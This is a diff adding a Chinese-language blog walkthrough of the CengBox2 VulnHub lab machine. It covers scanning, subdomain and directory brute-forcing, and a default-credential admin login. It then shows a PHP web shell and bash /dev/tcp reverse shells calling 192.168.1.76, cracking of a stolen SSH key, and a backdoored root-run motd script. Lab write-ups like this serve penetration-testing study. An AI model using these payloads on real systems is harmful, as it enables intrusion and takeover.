@@ -1,0 +1,99 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CengBox2-vulnhub渗透测试"><meta name="keywords" content="靶机渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>CengBox2-vulnhub渗透测试 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透过程"><span class="toc-number">2.</span> <span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后话"><span class="toc-number">3.</span> <span class="toc-text">后话</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">74</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">CengBox2-vulnhub渗透测试</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-10</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CengBox2靶机渗透</p>
+<p>目标：拿到root权限</p>
+<a id="more"></a>
+
+<p>考点：</p>
+<p>​    修改hosts，子域名爆破</p>
+<p>​    gobuster工具使用，字典wordlists,seclists使用</p>
+<p>​    ssh私钥爆破，私钥赋权600，</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>​    目标IP：192.168.1.134</p>
+<p>​    nmap扫描端口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -Pn <span class="number">192.168</span><span class="number">.1</span><span class="number">.134</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="image-20200610091229750"></p>
+<p>​    </p>
+<p>​    访问21号端口，获得<code>note.txt</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hey Kevin,</span><br><span class="line">I just set up your panel <span class="keyword">and</span> used <span class="keyword">default</span> password. Please change them before any hack.</span><br><span class="line"></span><br><span class="line">I <span class="keyword">try</span> to move site to <span class="keyword">new</span> domain which name is ceng-company.vm <span class="keyword">and</span> also I created a <span class="keyword">new</span> area <span class="keyword">for</span> you.</span><br><span class="line"></span><br><span class="line">Aaron</span><br></pre></td></tr></table></figure>
+
+<p>​    根据提示修改<code>/etc/hosts</code>，使得IP地址能够指向<code>ceng-company,vm</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.134</span>	ceng-company.vm</span><br></pre></td></tr></table></figure>
+
+<p>​    访问该地址，这里什么的都没有</p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="image-20200610091914832"></p>
+<p>​    </p>
+<p>​    <strong>扫描子域名</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million<span class="number">-5000.</span>txt --url http:<span class="comment">//ceng-company.vm</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="image-20200610095827570"></p>
+<p>​    发现子域名<code>admin.ceng-company.vm</code>，然后修改hosts</p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="image-20200610100713834"></p>
+<p>​    </p>
+<p>​    <strong>扫描目录</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  --url http:&#x2F;&#x2F;admin.ceng-company.vm</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="image-20200610101343840"></p>
+<p>​    登陆后到后台<code>admin</code>后，<code>kevin@ceng-company.vm:admin</code>登陆到后台</p>
+<p>​    删除<code>tmp</code>目录下的 <code>.htaccess</code>，这个文件已经被我删了….但是记得这个文件会拒绝所有php文件的上传</p>
+<p>​    然后写入shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.76/7777 0&gt;&amp;1'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;http:&#x2F;&#x2F;admin.ceng-company.vm&#x2F;gila&#x2F;tmp&#x2F;shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" alt="image-20200610104402719"></p>
+<p>​    </p>
+<p>​    执行<code>sudo -l</code>，这里表明用户swartz可以在无须密码验证的情况下使用脚本<code>/home/swartz/runphp.sh</code></p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="image-20200610104615465"></p>
+<p>​    查看<code>runphp.sh</code>，发现这是一个在swartz下运行php交互模式的脚本，运行该脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u swartz /home/swartz/runphp.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" alt="image-20200610111137576"></p>
+<p>​    此时提权至<code>swartz</code>，到<code>mitnick</code>目录下会发现这里的<code>mitnick</code>用户是有ssh密钥的，将<code>mitnick</code>的私钥复制一份到本机上。</p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" alt="image-20200610111954356"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" alt="image-20200610112756715"></p>
+<p>​    使用john爆破ssh密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/john/ssh2john.py test.rsa &gt; test.hash</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt test.hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.png" alt="image-20200610113252378"></p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13.png" alt="image-20200610113423890"></p>
+<p>​    爆破出密码为<code>legend</code></p>
+<p>​    给<code>test.rsa</code>加权600，因为此时<code>test.rsa</code>的权限太高了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">600</span> test.rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png" alt="image-20200610113823494"></p>
+<p>​    此时提权至<code>mitnick</code></p>
+<p>​    </p>
+<p>​    <strong>查看所属组就有rwx权限的文件，因为mitnick属于developers组</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -g+rwx <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png" alt="image-20200610115205093"></p>
+<p>​    关于<code>00-header</code>这个文件在进行ssh连接时，以<code>root</code>用户运行的脚本，一般用来使得ssh更为个性化。</p>
+<p>​    参考:<a href="https://cloud.tencent.com/developer/news/313453" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/313453</a></p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16.png" alt="image-20200610115500091"></p>
+<p>​    如图可见，该文件属于为root用户所拥有，所属于developers组。</p>
+<p>​    修改该文件</p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17.png" alt="image-20200610121936977"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/192.168.1.76/3333 0&gt;&amp;1'</span></span><br></pre></td></tr></table></figure>
+
+<p>​    然后重新ssh连接，监听3333端口</p>
+<p>​    此时提权至root</p>
+<p><img src="/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18.png" alt="image-20200610121804574"></p>
+<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>​    这个靶机学习的地方有很多，所属组的理解，对于find命令的理解和熟练使用</p>
+<p>​    后半部分<code>find / -type f -perm -g+rwx 2&gt;/dev/null</code>，该命令应该是提权过程中，很重要的一步。</p>
+<p>​    果然信息收集在渗透测试中属于最重要的部分。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">http://yoursite.com/2020/06/10/CengBox2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/06/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"><span>内网渗透之传输层隧道技术</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
